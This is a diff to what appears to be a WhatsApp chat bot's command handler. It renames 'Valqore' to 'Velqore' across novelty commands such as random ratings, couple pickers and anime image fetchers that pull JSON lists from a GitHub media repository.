+            await replygcVelqore(jawab)
             }
             break
 case 'rate': {
-            	if (!text) return replygcValqore(`Example : ${prefix + command} my profile`)
+            	if (!text) return replygcVelqore(`Example : ${prefix + command} my profile`)
             	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                 let kah = ra[Math.floor(Math.random() * ra.length)]
                 let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
-            await replygcValqore(jawab)
+            await replygcVelqore(jawab)
             }
             break
             case 'runtime': {
             	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
-                replygcValqore(lowq)
+                replygcVelqore(lowq)
             	}
             break
             case 'stupidcheck':case 'uncleancheck':
@@ -4940,15 +4936,15 @@ case 'coolcheck':
 case 'waifucheck':
 cantik = body.slice(1)
 const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
-const Valqorekak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
-ValqoreInc.sendMessage(m.chat, { text: Valqorekak }, { quoted: m })
+const Velqorekak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
+VelqoreInc.sendMessage(m.chat, { text: Velqorekak }, { quoted: m })
 break
             case 'soulmate': {
-            if (!m.isGroup) return ValqoreStickGroup()
+            if (!m.isGroup) return VelqoreStickGroup()
             let member = participants.map(u => u.id)
             let me = m.sender
             let jodoh = member[Math.floor(Math.random() * member.length)]
-ValqoreInc.sendMessage(m.chat,
+VelqoreInc.sendMessage(m.chat,
 { text: `👫Your Soulmate Is
 
 @${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
@@ -4963,17 +4959,17 @@ isForwarded: true,
 "body": `${ownername}`,
 "previewType": "PHOTO",
 "thumbnailUrl": ``,
-"thumbnail": fs.readFileSync(`./ValqoreMedia/theme/cheemspic.jpg`),
+"thumbnail": fs.readFileSync(`./VelqoreMedia/theme/cheemspic.jpg`),
 "sourceUrl": `${wagc}`}}},
 { quoted: m})        
             }
             break
  case 'couple': {
-            if (!m.isGroup) return ValqoreStickGroup()
+            if (!m.isGroup) return VelqoreStickGroup()
             let member = participants.map(u => u.id)
             let orang = member[Math.floor(Math.random() * member.length)]
             let jodoh = member[Math.floor(Math.random() * member.length)]
-ValqoreInc.sendMessage(m.chat,
+VelqoreInc.sendMessage(m.chat,
 { text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
 Cieeee, What's Going On❤️💖👀`,
 contextInfo:{
@@ -4987,165 +4983,165 @@ isForwarded: true,
 "body": `${ownername}`,
 "previewType": "PHOTO",
 "thumbnailUrl": ``,
-"thumbnail": fs.readFileSync(`./ValqoreMedia/theme/cheemspic.jpg`),
+"thumbnail": fs.readFileSync(`./VelqoreMedia/theme/cheemspic.jpg`),
 "sourceUrl": `${wagc}`}}},
 { quoted: m})        
             }
             break
                         case 'coffee': case 'kopi': {
-                ValqoreInc.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
+                VelqoreInc.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
             }
             break
             case 'wallpaper': {
-                if (!text) return replygcValqore('Enter Query Title')
-                await ValqoreStickWait()
+                if (!text) return replygcVelqore('Enter Query Title')
+                await VelqoreStickWait()
 		let { wallpaper } = require('./lib/scraper')
                 anuwallpep = await wallpaper(text)
                 result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
-                ValqoreInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
+                VelqoreInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
             }
             break
             case 'wikimedia': {
-                if (!text) return replygcValqore('Enter Query Title')
-                await ValqoreStickWait()
+                if (!text) return replygcVelqore('Enter Query Title')
+                await VelqoreStickWait()
 		let { wikimedia } = require('./lib/scraper')
                 let anumedia = await wikimedia(text)
                 result = anumedia[Math.floor(Math.random() * anumedia.length)]
-                ValqoreInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
+                VelqoreInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
             }
             break
             case 'loli': {
             let baseUrl = 'https://weeb-api.vercel.app/'
       const response = await fetch(baseUrl + command)
       const imageBuffer = await response.buffer() // Get the image data as a buffer
-      ValqoreInc.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
+      VelqoreInc.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
             }
             break
             case 'waifu': {
             let baseUrl = 'https://weeb-api.vercel.app/'
       const response = await fetch(baseUrl + command)
       const imageBuffer = await response.buffer() // Get the image data as a buffer
-      ValqoreInc.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
+      VelqoreInc.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
             }
             break
             case 'neko': {
             let baseUrl = 'https://weeb-api.vercel.app/'
       const response = await fetch(baseUrl + command)
       const imageBuffer = await response.buffer() // Get the image data as a buffer
-      ValqoreInc.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
+      VelqoreInc.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
             }
             case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
-await ValqoreStickWait()
+await VelqoreStickWait()
 let heyy
-if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/akira.json')
-if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/akiyama.json')
-if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/ana.json')
-if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/art.json')
-if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/asuna.json')
-if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/ayuzawa.json')
-if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/boneka.json')
-if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/boruto.json')
-if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/bts.json')
-if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/cecan.json')
-if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/chiho.json')
-if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/chitoge.json')
-if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/cogan.json')
-if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/cosplay.json')
-if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/cosplayloli.json')
-if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/cosplaysagiri.json')
-if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/cyber.json')
-if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/deidara.json')
-if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/doraemon.json')
-if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/eba.json')
-if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/elaina.json')
-if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/emilia.json')
-if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/erza.json')
-if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/exo.json')
-if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/femdom.json')
-if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/freefire.json')
-if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/gamewallpaper.json')
-if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/glasses.json')
-if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/gremory.json')
-if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/hekel.json')
-if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/hestia.json')
-if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/husbu.json')
-if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/inori.json')
-if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/islamic.json')
-if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/isuzu.json')
-if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/itachi.json')
-if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/itori.json')
-if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/jeni.json')
-if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/jiso.json')
-if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/justina.json')
-if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/kaga.json')
-if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/kagura.json')
-if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/kakasih.json')
-if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/kaori.json')
-if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/kartun.json')
-if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/katakata.json')
-if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/keneki.json')
-if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/kotori.json')
-if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/kpop.json')
-if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/kucing.json')
-if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/kurumi.json')
-if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/lisa.json')
-if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/loli.json')
-if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/madara.json')
-if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/megumin.json')
-if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/mikasa.json')
-if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/mikey.json')
-if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/miku.json')
-if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/minato.json')
-if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/mobil.json')
-if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/motor.json')
-if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/mountain.json')
-if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/naruto.json')
-if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/nekonime.json')
-if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/nezuko.json')
-if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/onepiece.json')
-if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/pentol.json')
-if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/pokemon.json')
-if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/profil.json')
-if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/programming.json')
-if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/pubg.json')
-if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/randblackpink.json')
-if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/randomnime.json')
-if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/randomnime2.json')
-if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/rize.json')
-if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/rose.json')
-if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/ryujin.json')
-if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/sagiri.json')
-if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/sakura.json')
-if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/sasuke.json')
-if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/satanic.json')
-if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/shina.json')
-if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/shinka.json')
-if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/shinomiya.json')
-if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/shizuka.json')
-if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/shota.json')
-if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/tatasurya.json')
-if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/technology.json')
-if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/tejina.json')
-if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/toukachan.json')
-if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/tsunade.json')
-if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/waifu.json')
-if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/wallhp.json')
-if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/wallml.json')
-if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/wallnime.json')
-if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/yotsuba.json')
-if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/yuki.json')
-if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/yulibocil.json')
-if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGValqore/ValqoreMedia/master/yumeko.json')
+if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/akira.json')
+if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/akiyama.json')
+if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/ana.json')
+if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/art.json')
+if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/asuna.json')
+if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/ayuzawa.json')
+if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/boneka.json')
+if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/boruto.json')
+if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/bts.json')
+if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/cecan.json')
+if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/chiho.json')
+if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/chitoge.json')
+if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/cogan.json')
+if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/cosplay.json')
+if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/cosplayloli.json')
+if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/cosplaysagiri.json')
+if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/cyber.json')
+if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/deidara.json')
+if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/doraemon.json')
+if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/eba.json')
+if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/elaina.json')
+if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/emilia.json')
+if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/erza.json')
+if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/exo.json')
+if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/femdom.json')
+if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/freefire.json')
+if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/gamewallpaper.json')
+if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/glasses.json')
+if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/gremory.json')
+if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/hekel.json')
+if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/hestia.json')
+if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/husbu.json')
+if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/inori.json')
+if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/islamic.json')
+if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/isuzu.json')
+if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/itachi.json')
+if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/itori.json')
+if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/jeni.json')
+if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/jiso.json')
+if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/justina.json')
+if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/kaga.json')
+if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/kagura.json')
+if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/kakasih.json')
+if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/kaori.json')
+if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/kartun.json')
+if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/katakata.json')
+if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/keneki.json')
+if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/kotori.json')
+if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/kpop.json')
+if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/kucing.json')
+if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/kurumi.json')
+if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/lisa.json')
+if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/loli.json')
+if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/madara.json')
+if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/megumin.json')
+if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/mikasa.json')
+if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/mikey.json')
+if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/miku.json')
+if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/minato.json')
+if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/mobil.json')
+if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/motor.json')
+if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/mountain.json')
+if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/naruto.json')
+if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/nekonime.json')
+if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/nezuko.json')
+if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/onepiece.json')
+if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/pentol.json')
+if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/pokemon.json')
+if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/profil.json')
+if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/programming.json')
+if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/pubg.json')
+if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/randblackpink.json')
+if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGVelqore/VelqoreMedia/master/randomnime.json')
